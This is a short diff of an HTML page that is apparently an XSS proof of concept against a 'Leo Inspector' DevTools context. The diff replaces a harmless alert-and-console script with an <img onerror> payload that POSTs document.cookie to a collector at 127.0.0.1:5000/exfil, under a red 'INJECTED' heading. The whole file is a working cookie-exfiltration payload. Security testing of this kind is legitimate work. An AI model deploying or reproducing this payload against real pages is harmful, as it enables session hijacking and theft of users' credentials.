@@ -1,24 +1,15 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Leo Inspector Injection</title>
-</head>
 <body>
-  <h1 style="color:red">INJECTED</h1>
 
-  <script>
-    // Visible proof
-    alert("Leo Inspector XSS");
+<h1 style="color:red">INJECTED</h1>
 
-    // show origin context
-    console.log("Executed in DevTools context");
+<img src=x onerror="
+fetch('http://127.0.0.1:5000/exfil', {
+  method: 'POST',
+  body: document.cookie
+})
+">
 
-    // Get Cookies
-    try {
-      console.log("Cookies:", document.cookie);
-    } catch (e) {
-      console.log("Cookie access blocked:", e);
-    }
-  </script>
 </body>
 </html>
